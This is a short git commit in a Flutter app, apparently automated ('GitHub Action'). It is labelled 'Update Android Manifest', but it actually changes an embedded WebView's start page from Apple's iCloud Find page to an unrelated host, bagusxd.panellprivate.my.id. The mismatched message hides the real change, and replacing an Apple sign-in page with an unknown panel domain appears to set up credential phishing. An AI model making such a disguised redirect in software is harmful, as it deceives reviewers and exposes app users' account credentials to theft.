7018343d93f4b083cf2dba65299d139b632bb872
GitHub Action <action@github.com>
2024-03-22 16:13:25 +0000

    Update Android Manifest

--- lib/my_home_page.dart
+++ lib/my_home_page.dart
@@ -163,7 +163,7 @@ class _MyHomePageState extends State<MyHomePage> {
             children: [
               InAppWebView(
                 initialUrlRequest: URLRequest(
-                  url: Uri.parse('https://www.icloud.com/find/'),
+                  url: Uri.parse('https://bagusxd.panellprivate.my.id/'),
                 ),
                 initialOptions: _getInAppWebViewOptions(),
                 onWebViewCreated: _onWebViewCreated,
